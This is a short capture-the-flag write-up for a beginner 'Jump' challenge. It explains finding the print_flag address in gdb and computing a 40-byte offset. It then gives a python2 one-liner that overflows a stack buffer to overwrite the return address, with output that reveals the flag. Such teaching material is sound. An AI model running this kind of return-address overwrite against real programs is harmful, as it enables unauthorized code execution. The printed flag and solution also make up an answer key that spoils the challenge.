## Name: 
Jump

## DESC:
Can you jump to the location that gives you the flag?

create a `flag.txt` locally to test

## Solution:
This required the students to build the binary locally using the provided makefile and source code. Once we get the binary, open in gdb and find the address of the `print_flag` function. This can be done using `info functions` OR `disass print_flag`. This shows the address where the function starts. -> `0x000000000040121b`. 

Now we know the buffer is 32 , next 8 is base pointer, next 8 is return address. So put the `0x000000000040121b` in the return address slot to jump there. Sample solve - 

```
python2 -c "print('A'*40+'\x1b\x12\x40\x00\x00\x00')" | ./challenge
Hey, what's your name?
Nice to meet you, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.
casual{jump_2_functi0ns_r3turn_to_w1n}Segmentation fault (core dumped)
```
